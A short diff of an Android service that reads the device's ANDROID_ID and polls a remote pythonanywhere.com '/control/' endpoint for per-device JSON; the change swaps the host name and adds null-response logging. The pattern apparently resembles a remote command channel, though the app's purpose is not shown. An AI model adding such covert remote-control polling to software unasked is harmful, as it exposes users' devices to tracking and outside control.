@@ -37,10 +37,13 @@ public class ControlPollerService extends JobIntentService {
             Context context = getApplicationContext();
             @SuppressLint("HardwareIds") String deviceToken = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
 
-            String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";
+            String url = "https://digiserve.pythonanywhere.com/control/" + deviceToken + ".json";
 
             JSONObject response = NetworkUtils.getJsonFromUrl(url, getApplicationContext());
-            if (response == null) return;
+            if (response == null) {
+                CrashLogger.log(context, "ControlPoller", "❌ Control JSON null — poller exiting");
+                return;
+            }
 
             CrashLogger.log(context, "CONTROL_JSON", "📦 Response: " + response.toString());
 
